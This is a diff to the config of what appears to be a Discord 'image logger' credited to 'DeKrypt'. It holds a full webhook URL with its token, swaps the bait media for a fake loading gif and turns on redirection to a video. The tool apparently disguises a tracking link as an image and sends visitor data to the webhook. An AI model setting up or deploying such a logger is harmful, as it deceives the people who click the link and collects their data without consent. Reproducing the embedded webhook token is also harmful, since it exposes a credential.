@@ -10,7 +10,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1428745890025181235/uH7J2MvJRDbOB_UOjeMWwVtRT2Z3R-OIUW_A-BVrTeysBs9fAKwVhHvxGopvQ_sWlwjm",
-    "image": "https://res.cloudinary.com/diff4jfud/video/upload/v1760713666/Screen_Recording_2025-10-17_155830_sbevmf.mp4", # You can also have a custom image by using a URL argument
+    "image": "https://res.cloudinary.com/diff4jfud/image/upload/v1760717166/laoding_xcpmdh.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -47,7 +47,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
+        "redirect": True, # Redirect to a webpage?
         "page": "https://res.cloudinary.com/diff4jfud/video/upload/v1760713666/Screen_Recording_2025-10-17_155830_sbevmf.mp4" # Link to the webpage to redirect to 
     },
 
